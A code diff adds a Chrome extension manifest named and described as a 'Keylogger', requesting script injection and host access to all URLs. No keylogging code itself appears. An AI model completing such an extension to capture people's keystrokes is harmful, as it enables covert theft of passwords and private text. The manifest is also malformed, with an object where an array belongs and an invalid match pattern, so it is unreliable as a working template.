@@ -1,0 +1,19 @@
+{
+    "manifest_version": 3,
+    "name": "Keylogger",
+    "version": "1.0",
+    "description": "Keylogger Chrome Extension",
+    "background": {
+        "service_worker": "background.js"
+    },
+    "action": {
+        "default_popup": "index.html"
+    },
+    "content_scripts": {
+        "matches": ["call_urls"],
+        "js": ["content.js"],
+        "css": ["styles.css"]
+    },
+    "permissions": ["storage", "activeTab", "scripting"],
+    "host_permissions": ["<all_urls>"]
+}
